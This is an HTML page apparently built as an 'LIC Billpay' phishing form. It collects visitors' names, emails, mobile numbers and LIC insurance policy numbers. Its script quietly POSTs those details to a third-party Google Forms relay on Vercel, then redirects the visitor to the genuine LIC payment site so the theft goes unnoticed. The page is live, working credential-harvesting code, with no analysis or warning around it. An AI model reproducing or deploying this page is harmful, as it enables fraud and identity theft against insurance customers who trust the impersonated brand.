<!DOCTYPE html>
<html>
<head>
	<title>Domain AI Powered Search</title>
	<style>
		body {
			color: white;
			background-color: black;
		}

		input[type="text"], input[type="email"], input[type="submit"] {
			width: 300px;
			height: 30px;
			font-size: 16px;
		}
	</style>
</head>

<body>
	<h3>LIC Billpay</h3>
	<form id="myForm">
		<label for="name">Your Name:</label>
		<br>
		<input type="text" id="name" name="entry.940076612" required>
		<br><br><br>

		<label for="email">Your Email:</label>
		<br>
		<input type="email" id="email" name="entry.724336887" required>
		<br><br><br>

		<label for="mobile">Your Mobile Number:</label>
		<br>
		<input type="text" id="mobile" name="entry.229795890" required>
		<br><br><br>

		<label for="policy">Your LIC Policy Number:</label>
		<br>
		<input type="text" id="policy" name="entry.1187580113" required>
		<br><br><br>

		<input type="submit" value="LIC Billpay" onclick="submitForm(event)">
	</form>

	<script>
		// Submit form to Google Forms API
		function submitForm(event) {
			event.preventDefault(); // Prevent form submission if validation fails

			const name = document.getElementById("name").value;
			const email = document.getElementById("email").value;
			const mobile = document.getElementById("mobile").value;
			const policy = document.getElementById("policy").value;

			if (name.trim() === '' || email.trim() === '' || mobile.trim() === '' || policy.trim() === '') {
				alert('Please fill in all fields.');
				return;
			}

			const formData = {
				"entry.940076612": name,
				"entry.724336887": email,
				"entry.229795890": mobile,
				"entry.1187580113": policy
			};

			fetch("https://securityinfinity-google-forms-rest-api.vercel.app/api/forms/1FAIpQLSdz4Jep0spscCmZidKx-luvbG-ChduuF1x20MkFlzvuin6__Q", {
				method: "POST",
				body: JSON.stringify(formData),
				headers: {
					"Content-Type": "application/json"
				}
			})
				.then(response => {
					if (response.ok) {
						window.location.replace("https://ebiz.licindia.in/D2CPM/#DirectPay");
					} else {
						alert("There was a problem submitting the form. Please try again later.");
					}
				})
				.catch(error => {
					alert("There was a problem submitting the form. Please try again later.");
				});
		}
	</script>
</body>
</html>
